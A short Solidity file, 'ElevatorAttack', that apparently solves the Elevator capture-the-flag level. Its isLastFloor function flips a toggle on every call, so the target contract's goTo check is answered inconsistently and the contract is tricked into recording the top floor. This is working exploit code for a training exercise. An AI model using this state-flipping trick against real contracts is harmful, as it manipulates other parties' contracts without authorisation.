//SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import './Elevator.sol';

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public target;

    constructor(address _targetAddr) public {
        target = Elevator(_targetAddr);
    }

    function isLastFloor(uint) public returns(bool) {
        toggle = !toggle;
        return toggle; 
    }
    
    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}